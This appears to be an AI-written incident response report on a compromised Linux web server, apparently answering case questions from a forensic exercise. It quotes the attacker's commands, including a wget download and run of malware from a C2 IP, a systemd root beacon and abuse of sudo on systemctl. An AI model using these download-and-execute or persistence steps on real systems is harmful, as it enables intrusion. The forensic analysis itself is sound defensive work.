All claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

**webserver-prod-02 has been compromised.** An attacker gained a shell as `www-data` (likely via a web application vulnerability), downloaded and executed malware from a known C2 server (`185.229.59.103`), then pivoted to the `deploy` account using a compromised SSH key. Using `deploy`'s NOPASSWD sudo privilege on `systemctl`, the attacker installed a persistent systemd beacon service that phones home to the C2 every 10 minutes as root.

## Attack Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| Unknown (before Apr 14) | Attacker gains shell as `www-data` via web exploit | var/www/.bash_history |
| Unknown | Attacker runs recon (`id`, `uname -a`), downloads malware (`wget http://185.229.59.103/u -O /tmp/.u`), executes it (`/tmp/.u &`), reads `/etc/passwd` | var/www/.bash_history:1-7 |
| Apr 14, 03:17:44 | Attacker logs into `deploy` via SSH from C2 IP `185.229.59.103` using a stolen SSH key | auth.log:30 |
| Apr 14, 03:18:02 | `deploy` runs `sudo cat /etc/passwd` (recon) | auth.log:32 |
| Apr 14, 03:18:12–17 | `deploy` copies `/tmp/update` to `/usr/local/bin/update` and makes it executable | auth.log:35-36 |
| Apr 14, 03:18:29 | `deploy` writes `system-updater.service` systemd unit via `sudo tee` | auth.log:37 |
| Apr 14, 03:18:44–03 | `deploy` runs `daemon-reload`, `enable`, and `start` on the malicious service | auth.log:38-40 |
| Apr 14, 08:25:10 | Legitimate `deploy` login from `10.0.1.50` resumes normal operations | auth.log:44 |

## Key Findings

1. **Malicious systemd persistence (CONFIRMED):** `etc/systemd/system/system-updater.service` runs as root and POSTs hostname/IP to `https://185.229.59.103:8443/beacon` every 600 seconds.

2. **C2 IP — 185.229.59.103 (CONFIRMED):** This IP is flagged as a known C2/beacon server. It was the source of the malicious `deploy` SSH login and the download target in the `www-data` shell history.

3. **Compromised deploy SSH key (CONFIRMED):** The `deploy` account authenticated from `185.229.59.103` via publickey at 03:17:44 on Apr 14. All other `deploy` logins came from `10.0.1.50`.

4. **Dangerous sudoers configuration (CONFIRMED):** `etc/sudoers.d/deploy` grants `deploy ALL=(root) NOPASSWD: /usr/bin/systemctl`. The attacker leveraged this to install and enable the malicious service without needing a password.

5. **www-data shell compromise (CONFIRMED):** `var/www/.bash_history` contains 7 commands showing post-exploitation activity: reconnaissance, malware download/execution from the C2 IP, and credential file access.

6. **Dropped payload:** `/tmp/update` was copied to `/usr/local/bin/update` — this binary was not available in the filesystem snapshot for analysis.

## Shell History Analysis

| Account | History File | Size | Commands | Assessment |
|---|---|---|---|---|
| **root** | `root/.bash_history` | 80 bytes | 4 | Benign (apt update/upgrade, systemctl, tail log) |
| **deploy** | `home/deploy/.bash_history` | 264 bytes | 15 | Routine CI/CD (git, npm, docker) — does NOT contain attacker commands |
| **alice** | `home/alice/.bash_history` | 123 bytes | 6 | Benign (log review, nginx status checks) |
| **www-data** | `var/www/.bash_history` | 103 bytes | 7 | **MALICIOUS** — recon, malware download, execution, credential access |
| **bob** | *(no history file)* | — | — | No history file found in filesystem snapshot |

## Case Questions

**Case Q1:** Shell histories were analyzed for four accounts: **root**, **deploy**, **alice**, and **www-data**. Bob is listed in `/etc/passwd` but had no shell history file in the filesystem snapshot.

**Case Q2:** Yes — the **www-data** account's shell history (`var/www/.bash_history`) shows what the attacker did. The attacker ran reconnaissance (`id`, `uname -a`), downloaded malware from the C2 server (`wget http://185.229.59.103/u -O /tmp/.u`), made it executable (`chmod +x /tmp/.u`), ran it in the background (`/tmp/.u &`), and read `/etc/passwd`. Additionally, the **auth.log** (not shell history) shows the attacker used the **deploy** account's sudo privileges to install a persistent C2 beacon service (`system-updater.service`), but those commands were **not** recorded in deploy's `.bash_history` — they are only visible in the auth log's sudo entries.

## Recommendations

1. **Immediately disable** the `system-updater.service` and remove the unit file.
2. **Rotate all SSH keys** for the `deploy` account and investigate how the key was compromised.
3. **Remove** `/usr/local/bin/update` and investigate `/tmp/.u` if still present.
4. **Restrict deploy's sudo** — replace the blanket `NOPASSWD: /usr/bin/systemctl` with specific service-scoped commands (e.g., `systemctl restart nginx`).
5. **Block C2 IP** `185.229.59.103` at the network perimeter.
6. **Investigate the web application** to determine how the attacker obtained a `www-data` shell.
7. **Check other hosts** for the same C2 beacon or SSH key compromise.